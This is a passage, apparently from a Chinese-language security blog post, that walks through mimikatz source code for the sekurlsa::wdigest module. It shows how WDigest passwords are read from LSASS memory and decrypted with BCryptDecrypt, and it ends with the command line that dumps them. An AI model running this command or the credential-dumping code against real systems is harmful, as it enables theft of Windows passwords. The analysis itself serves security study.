                if(kull_m_process_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
                {
                    if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
                        (*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
                    password = &mesCreds->Password;
                }

                if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
                {
                    kprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
                        L"%wZ\t%wZ\t"
                        :
                        L"\n\t * Username : %wZ"
                        L"\n\t * Domain   : %wZ"
                        L"\n\t * Password : "
                        , username, domain);

                        if(password)
                        {
                            if(kull_m_string_suspectUnicodeString(password))
                            {
                                if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS))
                                    kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
                                else kprintf(L"%wZ", password);
                            }
                            else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
                        }
                        // ...
                        else kprintf(L"(null)");

                        if(username)
                            kuhl_m_sekurlsa_trymarshal(username);

                }

                // ...
            }
        }
        if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
            kprintf(L"\n");

        if(sid)
            LocalFree(sid);
    }
    else kprintf(L"LUID KO\n");
}
```

该函数先打印 WDigest 凭据中的用户名和域名，最后使用 `*lsassLocalHelper->pLsaUnprotectMemory` 指向的函数对凭据中的用户密码进行解密，在这里是 `kuhl_m_sekurlsa_nt6_LsaUnprotectMemory()` 函数，该函数定义如下。

```cpp
VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
    kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}
```

跟进 `kuhl_m_sekurlsa_nt6_LsaEncryptMemory()` 函数，如下所示，该函数对 `BCryptEncrypt()` 和 `BCryptDecrypt()` 函数进行封装，二者利用提供的初始化向量和密钥，分别对指定内存的数据块进行加密和解密。

```cpp
NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
    NTSTATUS status = STATUS_NOT_FOUND;
    BCRYPT_KEY_HANDLE *hKey;
    BYTE LocalInitializationVector[16];
    ULONG cbIV, cbResult;
    PBCRYPT_ENCRYPT cryptFunc = Encrypt ? BCryptEncrypt : BCryptDecrypt;
    RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
    if(cbMemory % 8)
    {
        hKey = &kAes.hKey;
        cbIV = sizeof(InitializationVector);
    }
    else
    {
        hKey = &k3Des.hKey;
        cbIV = sizeof(InitializationVector) / 2;
    }
    __try
    {
        status = cryptFunc(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0);
    }
    __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
    return status;
}
```

最后将解密后的密码打印出来。

Let’s see it in action
======================

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" exit
```

![image-20230512112354722](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a83f4027fa928ee89de7438ead27ea789e530484.png)